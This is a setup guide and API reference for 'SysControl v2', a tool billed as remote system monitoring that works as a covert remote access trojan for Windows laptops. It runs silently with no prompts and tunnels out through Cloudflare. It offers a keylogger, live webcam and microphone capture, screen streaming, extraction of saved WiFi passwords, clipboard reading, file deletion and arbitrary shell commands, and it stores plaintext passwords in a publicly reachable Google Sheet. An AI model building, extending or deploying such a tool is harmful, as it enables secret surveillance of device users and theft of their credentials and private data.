# SysControl v2 — Complete Setup Guide

A remote system monitoring tool. Control any Windows laptop from your phone/browser.

---

## Architecture Overview

```
┌──────────────────┐      ┌──────────────────────┐      ┌──────────────────────┐
│   Frontend       │      │   Google Apps Script  │      │   Backend (Laptop)   │
│   Netlify Site   │◄────►│   Device Registry     │◄────►│   server.py / .exe   │
│   index.html     │      │   Google Sheets DB    │      │   Port 5000          │
│   main.js        │      │                       │      │   + Cloudflare Tunnel│
│   style.css      │      │                       │      │                      │
└──────────────────┘      └──────────────────────┘      └──────────────────────┘
      ▲                                                        ▲
      │              Direct HTTPS connection                   │
      └────────────────────────────────────────────────────────┘
                    (via Cloudflare Tunnel URL)
```

**How it works:**
1. Backend runs on a laptop → auto-configures (hostname, random password) → starts Cloudflare tunnel → gets public HTTPS URL
2. Backend registers tunnel URL + device info + password to Google Apps Script (→ Google Sheet)
3. Frontend fetches Google Apps Script → discovers all registered devices with passwords
4. User taps a device → auto-connects using stored password → direct HTTPS to the laptop

**Key design:**
- **Frontend** = deployed once on Netlify, works for ALL devices
- **Backend** = runs on each laptop you want to control — zero-config, no input needed
- **Google Apps Script** = free, always-on device registry backed by Google Sheets
- **Zero-config** = install → run → done. No passwords to type, no IDs to copy

---

## Prerequisites

| Requirement | Purpose | How to get it |
|---|---|---|
| **Python 3.10+** | Backend runtime | https://python.org |
| **cloudflared** | HTTPS tunnel | `winget install cloudflare.cloudflared` |
| **Google account** | Device registry | https://accounts.google.com |
| **Netlify account** | Frontend hosting | https://netlify.com (free) |

---

## Step 1: Create the Google Apps Script Registry (5 minutes)

This is a one-time setup. The Apps Script acts as your device registry.

1. Go to [Google Sheets](https://sheets.google.com) and create a new spreadsheet
2. Name it **SysControl** (or any name you like)
3. Go to **Extensions → Apps Script**
4. Delete any default code in the editor
5. Copy-paste the contents of `gas/Code.gs` into the editor
6. Click **Save** (Ctrl+S)
7. Click **Deploy → New deployment**
8. Click the gear icon → choose **Web app**
9. Set:
   - **Description**: SysControl Device Registry
   - **Execute as**: Me
   - **Who has access**: Anyone
10. Click **Deploy**
11. **Authorize** when prompted (click "Advanced" → "Go to SysControl" if Google warns)
12. **Copy the Web App URL** — it looks like:
    ```
    https://script.google.com/macros/s/AKfycb.../exec
    ```

### Paste the URL in two places:

**Backend** — `backend/registry.py` line 11:
```python
GAS_URL = "https://script.google.com/macros/s/YOUR_ID_HERE/exec"
```

**Frontend** — `frontend/main.js` line 3:
```javascript
var GAS_URL = "https://script.google.com/macros/s/YOUR_ID_HERE/exec";
```

Both use the **same URL**.

---

## Step 2: Set Up the Backend (2 minutes)

### Option A: Run from source

```powershell
cd backend
python -m venv .venv
.venv\Scripts\activate
pip install -r requirements.txt
python server.py
```

Or use the shortcut: `backend\install.bat`

### Option B: Run the .exe

```powershell
cd backend
build.bat                     # creates dist\SystemMonitor.exe
dist\SystemMonitor.exe        # run it
```

### What happens automatically on first run:

1. **Auto-config**: Device name = your PC hostname, password = random generated, JWT secret = random
2. **Tunnel**: Cloudflare Quick Tunnel starts → public HTTPS URL created
3. **Registry**: Device info + password sent to Google Apps Script → stored in Google Sheet
4. **Heartbeat**: URL updated every 5 minutes

No browser opens. No setup page. No input needed. The server runs silently.

### Config storage

All config is stored in **Windows Credential Manager** (encrypted by OS):
- Service: `SysControl`
- Contains: password hash, plaintext password, device ID, device name, JWT secret

To reset config: open Credential Manager → Windows Credentials → delete `SysControl`

---

## Step 3: Deploy the Frontend (2 minutes)

### Option A: Netlify drag-and-drop

1. Go to https://app.netlify.com
2. Drag the `frontend/` folder onto the page
3. Done — you get a URL like `https://your-site.netlify.app`

### Option B: Netlify CLI

```bash
npm install -g netlify-cli
netlify deploy --prod --dir frontend
```

### What the frontend does:

1. Fetches all devices from Google Apps Script (with passwords)
2. Shows device cards with online/offline status
3. Click a device → auto-connects using the stored password
4. Opens the control panel — no password modal needed

---

## Step 4: Add More Devices

Just install and run the backend on any new laptop:

```powershell
python server.py
```

That's it. The new device auto-registers in the Google Sheet and appears on the frontend. Same Google Apps Script URL for all devices.

---

## Project Structure

```
SysControl-v2/
├── backend/
│   ├── server.py              ← Main HTTP server, all routes, zero-config startup
│   ├── config.py              ← Config storage (Windows Credential Manager)
│   ├── auth.py                ← JWT authentication (HS256, 24h)
│   ├── tunnel.py              ← Cloudflare Quick Tunnel management
│   ├── registry.py            ← Google Apps Script API (register/heartbeat/offline)
│   ├── updater.py             ← Auto-update from GitHub Releases
│   ├── requirements.txt       ← Python dependencies
│   ├── build.bat              ← PyInstaller build script
│   ├── install.bat            ← Dev setup shortcut
│   └── features/
│       ├── screen.py          ← Screenshot + live screen streaming
│       ├── webcam.py          ← Webcam capture + live feed (ffmpeg)
│       ├── shell.py           ← Remote shell command execution
│       ├── files.py           ← File explorer, editor, upload/download
│       ├── system.py          ← System info, IP, clipboard, WiFi, lock, shutdown
│       ├── audio.py           ← Text-to-speech + live microphone
│       └── keylog.py          ← Keyboard logger (pynput)
├── frontend/
│   ├── index.html             ← Single-page app UI
│   ├── main.js                ← All frontend logic — auto-discovery, auto-connect, API calls
│   ├── style.css              ← Dark theme styles
│   └── manifest.json          ← PWA manifest
├── gas/
│   ├── Code.gs                ← Google Apps Script code (paste into Apps Script editor)
│   └── SETUP.md               ← Apps Script deployment instructions
├── CLAUDE.md                  ← Claude Code project guidance
└── setup.md                   ← This file
```

---

## Backend Dependencies

| Package | Purpose |
|---|---|
| `mss` | Screenshot capture |
| `Pillow` | Image processing |
| `keyring` | Windows Credential Manager access |
| `pyttsx3` | Text-to-speech |
| `requests` | HTTP client (Google Apps Script API calls) |
| `pyperclip` | Clipboard access |
| `pynput` | Keyboard listener |
| `sounddevice` | Microphone capture |
| `PyJWT` | JWT token creation/verification |
| `bcrypt` | Password hashing |

---

## API Reference

### Public endpoints (no auth)

| Method | Path | Description |
|---|---|---|
| `GET` | `/` | Status page (device info, tunnel status) |
| `GET` | `/api/status` | JSON health check |
| `POST` | `/api/login` | Authenticate with password → get JWT |

### Protected endpoints (JWT required)

| Method | Path | Description |
|---|---|---|
| `POST` | `/api/cmd` | Execute a command (slash commands or shell) |
| `POST` | `/api/upload` | Upload file to device |
| `POST` | `/api/read-file` | Read file contents |
| `POST` | `/api/save-file` | Save file contents |
| `GET` | `/api/screen-live` | Live screen frame (JPEG) |
| `GET` | `/api/webcam-live` | Live webcam frame (JPEG) |
| `POST` | `/api/webcam/start` | Start webcam live feed |
| `POST` | `/api/webcam/stop` | Stop webcam live feed |
| `GET` | `/api/mic/chunk` | Get microphone audio chunk (WAV) |
| `POST` | `/api/mic/start` | Start microphone recording |
| `POST` | `/api/mic/stop` | Stop microphone recording |
| `POST` | `/api/keylog/start` | Start keylogger |
| `POST` | `/api/keylog/stop` | Stop keylogger |
| `POST` | `/api/keylog/clear` | Clear keylog buffer |
| `GET` | `/api/keylog/data` | Get captured keystrokes |

### Slash commands (via `/api/cmd`)

| Command | Description |
|---|---|
| `/screen` | Take screenshot |
| `/webcam` | Take webcam photo |
| `/sys` | System information |
| `/ip` | Public IP address |
| `/clipboard` | Read clipboard |
| `/wifi` | Saved WiFi passwords |
| `/lock` | Lock screen |
| `/shutdown` | Shutdown PC (5s delay) |
| `/speech <text>` | Text-to-speech |
| `/drives` | List drives |
| `/browse [path]` | Browse directory |
| `/download <path>` | Download file |
| `/delete <path>` | Delete file/folder |
| `/rename <path>\|<name>` | Rename file/folder |
| `/mkdir <path>` | Create folder |
| `/mkfile <path>` | Create empty file |
| `/shellcmd <cmd>` | Execute shell command |
| Any other text | Executed as shell command |

---

## Troubleshooting

### Backend shows "Connecting..." for tunnel
- Install cloudflared: `winget install cloudflare.cloudflared`
- Make sure you have internet access

### Device doesn't appear on frontend
1. Check the Google Sheet — is the device row there?
2. Make sure `GAS_URL` is the same in both `registry.py` and `main.js`
3. Wait 30 seconds after starting the backend — registration takes a moment

### Frontend shows "Cannot reach registry"
1. Check your internet connection
2. Verify the Google Apps Script is deployed (test the URL in a browser with `?action=devices`)

### Frontend shows "No devices registered yet"
1. Start the backend first
2. Check the Google Sheet for device entries

### Can't connect to device (auto-login fails)
1. Make sure the device is online (green status)
2. The tunnel URL changes on restart — wait for heartbeat to update
3. Check the Google Sheet — does the device row have a password in column I?

### Reset a device config
1. Open Windows Credential Manager
2. Go to Windows Credentials
3. Delete the `SysControl` entry
4. Restart `server.py` — it will auto-setup fresh

---

## Updating the Apps Script

If you modify `Code.gs`:
1. Go to your Apps Script editor
2. Paste the updated code
3. Click **Deploy → Manage deployments**
4. Edit the existing deployment → set **Version** to "New version"
5. Click **Deploy**

The URL stays the same — no need to update backend/frontend.

---

## Data in Google Sheets

The "Devices" sheet has these columns:

| Column | Description |
|---|---|
| device_id | Unique 12-char hex ID |
| name | PC hostname (auto-detected) |
| url | Current Cloudflare tunnel URL |
| version | Backend version |
| online | true/false |
| last_seen | ISO timestamp of last heartbeat |
| os | Operating system info |
| ip | (reserved) |
| password | Auto-generated password (shared to frontend) |

You can view and edit device data directly in the spreadsheet.

---

## Quick Reference

| Item | Value |
|---|---|
| Backend port | 5000 |
| JWT expiry | 24 hours |
| Heartbeat interval | 5 minutes |
| Tunnel URL | Changes each restart — auto-updated in registry |
| Config location | Windows Credential Manager → `SysControl` |
| Device ID | Random 12-char hex (generated once on first run) |
